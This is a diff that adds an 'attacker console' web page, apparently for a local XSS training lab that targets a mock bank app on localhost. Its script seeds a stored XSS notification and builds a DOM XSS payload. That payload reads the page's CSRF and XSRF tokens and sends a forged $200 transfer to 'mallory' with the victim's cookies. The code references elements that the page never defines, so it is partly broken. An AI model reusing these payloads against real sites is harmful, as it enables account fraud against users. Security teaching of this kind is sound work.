@@ -1,0 +1,202 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Injection Console</title>
+  <link rel="stylesheet" href="/styles.css" />
+</head>
+<body>
+  <div class="bg-glow glow-1"></div>
+  <div class="bg-glow glow-2"></div>
+
+  <main class="landing">
+    <section class="promo-card">
+      <span class="tag">Attacker Console</span>
+      <h1>Malicious Injection Console</h1>
+
+      <div class="single-attack-card">
+        <div class="attack-card">
+          <span class="attack-badge">STORED XSS PAYLOAD</span>
+          <h3>Deploy Malicious Notification</h3>
+          <p>
+            Injects a fake bank-style notification containing a Stored XSS payload.
+            After deployment, the victim only needs to refresh the bank dashboard once.
+          </p>
+          <button id="plantNotificationAttack" class="action-btn danger-btn">
+            Deploy Payload
+          </button>
+        </div>
+      </div>
+
+      <div class="status-box waiting" id="statusBox">
+        <div class="status-title">System ready</div>
+        <div class="status-text">Awaiting payload deployment.</div>
+      </div>
+    </section>
+  </main>
+
+  <iframe name="hiddenFrame" style="display:none;"></iframe>
+
+  <form
+    id="seedForm"
+    action="http://localhost:3000/seed-xss-open"
+    method="POST"
+    target="hiddenFrame"
+  >
+    <input type="hidden" name="attackId" id="attackIdField" value="" />
+  </form>
+
+  <form
+    id="armDomForm"
+    action="http://localhost:3000/arm-dom-xss"
+    method="POST"
+    target="hiddenFrame"
+  >
+    <input type="hidden" name="attackId" id="domAttackIdField" value="" />
+  </form>
+
+  <script>
+    const statusBox = document.getElementById("statusBox");
+    const attackIdField = document.getElementById("attackIdField");
+    const domAttackIdField = document.getElementById("domAttackIdField");
+    const domAttackLink = document.getElementById("domAttackLink");
+    let currentAttackId = null;
+    let pollingTimer = null;
+
+    function randomAttackId() {
+      return "atk_" + Date.now() + "_" + Math.random().toString(36).slice(2, 10);
+    }
+
+    function setStatus(type, title, text) {
+      statusBox.className = "status-box " + type;
+      statusBox.innerHTML = `
+        <div class="status-title">${title}</div>
+        <div class="status-text">${text}</div>
+      `;
+    }
+
+    function stopPolling() {
+      if (pollingTimer) {
+        clearInterval(pollingTimer);
+        pollingTimer = null;
+      }
+    }
+
+    async function checkAttackStatus() {
+      if (!currentAttackId) return;
+
+      try {
+        const response = await fetch(
+          `http://localhost:3000/attack-status?attackId=${encodeURIComponent(currentAttackId)}`
+        );
+        const data = await response.json();
+
+        if (data.status === "planted") {
+          setStatus(
+            "waiting",
+            "Payload deployed",
+            "Waiting for victim action. The attack has been armed successfully."
+          );
+          return;
+        }
+
+        if (data.status === "succeeded") {
+          setStatus(
+            "success",
+            "Attack succeeded",
+            data.message || "The victim opened the bank page and the payload executed successfully."
+          );
+          stopPolling();
+          return;
+        }
+
+        if (data.status === "neutralized") {
+          setStatus(
+            "blocked",
+            "Payload neutralized",
+            data.message || "The victim triggered High mode protections and the payload was neutralized."
+          );
+          stopPolling();
+          return;
+        }
+
+        if (data.status === "failed") {
+          setStatus(
+            "blocked",
+            "Execution failed",
+            data.message || "The payload executed but the forged action did not complete."
+          );
+          stopPolling();
+          return;
+        }
+      } catch (err) {
+        console.error("Attack status polling failed:", err);
+      }
+    }
+
+    function startPolling() {
+      stopPolling();
+      pollingTimer = setInterval(checkAttackStatus, 1000);
+    }
+
+    function buildDomPayload(attackId) {
+      return `<img src="x" onerror="(function(){const csrf=(document.getElementById('globalCsrfToken')&&document.getElementById('globalCsrfToken').value)||'';const xsrf=(document.getElementById('globalXsrfToken')&&document.getElementById('globalXsrfToken').value)||'';const body=new URLSearchParams({to:'mallory',amount:'200',csrfToken:csrf,xsrfToken:xsrf,attackVector:'dom-xss-csrf',attackId:'${attackId}'});fetch('/transfer',{method:'POST',headers:{'Content-Type':'application/x-www-form-urlencoded'},credentials:'include',body:body.toString()}).then(function(){window.location='/dashboard';}).catch(function(err){console.error(err);});})();">`;
+    }
+
+    function buildDomAttackLink(attackId) {
+      const payloadHtml = buildDomPayload(attackId);
+      const encodedPayload = encodeURIComponent(btoa(payloadHtml));
+      return `http://localhost:3000/dashboard#domxss:${attackId}:${encodedPayload}`;
+    }
+
+    document.getElementById("plantNotificationAttack").addEventListener("click", function () {
+      currentAttackId = randomAttackId();
+      attackIdField.value = currentAttackId;
+
+      setStatus(
+        "waiting",
+        "Deploying payload",
+        "Injecting malicious notification into the bank dashboard..."
+      );
+
+      document.getElementById("seedForm").submit();
+
+      setTimeout(function () {
+        setStatus(
+          "waiting",
+          "Payload deployed",
+          "Waiting for victim refresh. Ask the victim to refresh the bank dashboard once."
+        );
+        startPolling();
+      }, 500);
+    });
+
+    document.getElementById("generateDomAttack").addEventListener("click", function () {
+      currentAttackId = randomAttackId();
+      domAttackIdField.value = currentAttackId;
+
+      setStatus(
+        "waiting",
+        "Arming DOM XSS attack",
+        "Registering DOM-based attack monitor and generating malicious bank URL..."
+      );
+
+      document.getElementById("armDomForm").submit();
+
+      setTimeout(function () {
+        const link = buildDomAttackLink(currentAttackId);
+        domAttackLink.value = link;
+
+        setStatus(
+          "waiting",
+          "DOM XSS link generated",
+          "Open the generated bank URL while the victim is logged in. The payload runs inside the bank page."
+        );
+
+        startPolling();
+      }, 300);
+    });
+  </script>
+</body>
+</html>
